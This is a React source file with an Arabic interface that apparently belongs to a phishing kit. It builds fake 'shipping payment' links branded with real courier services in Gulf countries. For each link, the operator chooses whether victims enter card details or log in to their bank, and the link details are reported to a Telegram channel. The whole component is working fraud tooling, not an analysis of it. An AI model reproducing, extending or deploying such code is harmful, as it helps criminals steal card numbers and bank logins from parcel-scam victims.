import { useState, useMemo } from "react";
import { useParams } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getServicesByCountry } from "@/lib/gccShippingServices";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBanksByCountry } from "@/lib/banks";
import { Package, DollarSign, Hash, Building2, Copy, Eye } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import TelegramTest from "@/components/TelegramTest";

type PaymentMethodOption = "card" | "login";

const CreateShippingLink = () => {
  const { country } = useParams();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");
  const services = getServicesByCountry(country?.toUpperCase() || "");
  
  const [selectedService, setSelectedService] = useState("");
  const [trackingNumber, setTrackingNumber] = useState("");
  const [packageDescription, setPackageDescription] = useState("");
  const [codAmount, setCodAmount] = useState("");
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethodOption>("card");
  const [createdLinkUrl, setCreatedLinkUrl] = useState("");
  const [isCopied, setIsCopied] = useState(false);
  
  // Get banks for the selected country
  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
  
  // Get selected service details and branding
  const selectedServiceData = useMemo(() => 
    services.find(s => s.key === selectedService),
    [services, selectedService]
  );
  
  const serviceBranding = useMemo(() => 
    selectedService ? getServiceBranding(selectedService) : null,
    [selectedService]
  );
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!selectedService || !trackingNumber) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول المطلوبة",
        variant: "destructive",
      });
      return;
    }

    setCreatedLinkUrl("");
    setIsCopied(false);

    try {
      const link = await createLink.mutateAsync({
        type: "shipping",
        country_code: country || "",
        payload: {
          service_key: selectedService,
          service_name: selectedServiceData?.name || selectedService,
          tracking_number: trackingNumber,
          package_description: packageDescription,
          cod_amount: parseFloat(codAmount) || 0,
          payment_method: paymentMethod,
        },
      });

      const paymentUrl = `${window.location.origin}/pay/${link.id}/recipient?service=${selectedService}`;

      const telegramResult = await sendToTelegram({
        type: 'shipping_link_created',
        data: {
          tracking_number: trackingNumber,
          service_name: selectedServiceData?.name || selectedService,
          package_description: packageDescription,
          cod_amount: parseFloat(codAmount) || 0,
          country: countryData.nameAr,
          payment_url: paymentUrl,
          payment_method: paymentMethod,
        },
        timestamp: new Date().toISOString(),
      });

      if (telegramResult.success) {
        toast({
          title: "تم الإرسال بنجاح",
          description: "تم إرسال البيانات إلى التليجرام",
        });
      } else {
        console.error('Telegram error:', telegramResult.error);
        toast({
          title: "تحذير",
          description: "تم إنشاء الرابط ولكن فشل في إرسال البيانات إلى التليجرام",
          variant: "destructive",
        });
      }

      setCreatedLinkUrl(paymentUrl);
      setIsCopied(false);
      toast({
        title: "تم إنشاء الرابط",
        description: "يمكنك نسخ الرابط أو معاينته قبل مشاركته",
      });
    } catch (error) {
      console.error("Error creating link:", error);
      toast({
        title: "حدث خطأ",
        description: "تعذر إنشاء رابط الدفع، الرجاء المحاولة مرة أخرى",
        variant: "destructive",
      });
    }
  };

  const handleCopyLink = async () => {
    if (!createdLinkUrl) return;
    try {
      await navigator.clipboard.writeText(createdLinkUrl);
      setIsCopied(true);
      toast({
        title: "تم النسخ",
        description: "تم نسخ رابط الدفع إلى الحافظة",
      });
      window.open(createdLinkUrl, "_blank", "noopener,noreferrer");
    } catch (error) {
      console.error("Copy link error:", error);
      toast({
        title: "تعذر النسخ",
        description: "حدث خطأ أثناء نسخ الرابط، حاول مرة أخرى",
        variant: "destructive",
      });
    }
  };

  const handlePreviewLink = () => {
    if (!createdLinkUrl) return;
    window.location.href = createdLinkUrl;
  };
  
  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Package className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button asChild>
            <a href="/services">العودة للخدمات</a>
          </Button>
        </div>
      </div>
    );
  }
  
  return (
    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        {/* Telegram Test Component */}
        <div className="mb-6">
          <TelegramTest />
        </div>
        
        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-elevated">
            <div
              className="h-16 -m-4 mb-4 rounded-t-xl relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
              <div className="absolute bottom-2 right-4 text-white">
                <h1 className="text-lg font-bold">إنشاء رابط دفع - شحن</h1>
                <p className="text-xs opacity-90">{countryData.nameAr}</p>
              </div>
            </div>
            
            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Service Selection with Logo and Description */}
              <div>
                <Label className="mb-2 text-sm">خدمة الشحن *</Label>
                <Select value={selectedService} onValueChange={setSelectedService}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر خدمة الشحن" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    {services.map((service) => (
                      <SelectItem key={service.id} value={service.key}>
                        {service.name}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              {/* Service Logo and Description */}
              {selectedService && serviceBranding && selectedServiceData && (
                <div className="p-3 rounded-lg border border-border bg-card/50">
                  <div className="flex items-center gap-3 mb-2">
                    {serviceBranding.logo && (
                      <img 
                        src={serviceBranding.logo} 
                        alt={selectedServiceData.name}
                        className="h-8 object-contain"
                        onError={(e) => {
                          e.currentTarget.style.display = 'none';
                        }}
                      />
                    )}
                    <div>
                      <h3 className="font-semibold text-sm">{selectedServiceData.name}</h3>
                    </div>
                  </div>
                  <p className="text-xs text-muted-foreground">{selectedServiceData.description}</p>
                </div>
              )}
              
              {/* Tracking Number */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Hash className="w-3 h-3" />
                  رقم الشحنة *
                </Label>
                <Input
                  value={trackingNumber}
                  onChange={(e) => setTrackingNumber(e.target.value)}
                  placeholder="مثال: 1234567890"
                  className="h-9 text-sm"
                  required
                />
              </div>
              
              {/* Package Description */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Package className="w-3 h-3" />
                  وصف الطرد
                </Label>
                <Input
                  value={packageDescription}
                  onChange={(e) => setPackageDescription(e.target.value)}
                  placeholder="مثال: ملابس، إلكترونيات"
                  className="h-9 text-sm"
                />
              </div>
              
              {/* COD Amount */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <DollarSign className="w-3 h-3" />
                  مبلغ الدفع عند الاستلام
                </Label>
                <Input
                  type="number"
                  value={codAmount}
                  onChange={(e) => setCodAmount(e.target.value)}
                  placeholder="0.00"
                  className="h-9 text-sm"
                  step="0.01"
                  min="0"
                />
              </div>

              {/* Payment Method */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Building2 className="w-3 h-3" />
                  طريقة إكمال الدفع
                </Label>
                <Select
                  value={paymentMethod}
                  onValueChange={(value) => {
                    const method = value as PaymentMethodOption;
                    setPaymentMethod(method);
                  }}
                >
                  <SelectTrigger className="h-9 text-sm">
                    <SelectValue placeholder="اختر الطريقة" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    <SelectItem value="card">تفاصيل البطاقة مباشرة</SelectItem>
                    <SelectItem value="login" disabled={banks.length === 0}>
                      تسجيل الدخول إلى البنك
                    </SelectItem>
                  </SelectContent>
                </Select>
                <p className="text-xs text-muted-foreground mt-1">
                  يمكنك اختيار السماح للعميل بإدخال بيانات البطاقة أو تسجيل الدخول لحسابه البنكي.
                </p>
              </div>

              {/* Submit Button */}
              <Button
                type="submit"
                className="w-full py-5"
                disabled={createLink.isPending}
              >
                {createLink.isPending ? (
                  <span className="text-sm">جاري الإنشاء...</span>
                ) : (
                  <>
                    <Package className="w-4 h-4 ml-2" />
                    <span className="text-sm">إنشاء رابط الدفع</span>
                  </>
                )}
              </Button>
            </form>

            {createdLinkUrl && (
              <div className="mt-6 space-y-4">
                <div className="p-3 rounded-lg border border-dashed bg-muted/30">
                  <p className="text-xs text-muted-foreground mb-2">الرابط الذي تم إنشاؤه</p>
                  <p className="text-sm font-mono break-all text-foreground">{createdLinkUrl}</p>
                </div>
                <div className="flex flex-col sm:flex-row gap-3">
                  <Button
                    type="button"
                    onClick={handleCopyLink}
                    className="flex-1 py-4"
                    variant={isCopied ? "secondary" : "default"}
                  >
                    <Copy className="w-4 h-4 ml-2" />
                    <span>{isCopied ? "تم نسخ الرابط" : "نسخ الرابط"}</span>
                  </Button>
                  <Button
                    type="button"
                    onClick={handlePreviewLink}
                    variant="outline"
                    className="flex-1 py-4"
                  >
                    <Eye className="w-4 h-4 ml-2" />
                    <span>معاينة الرابط</span>
                  </Button>
                </div>
              </div>
            )}
          </Card>
        </div>
      </div>
    </div>
  );
};

export default CreateShippingLink;
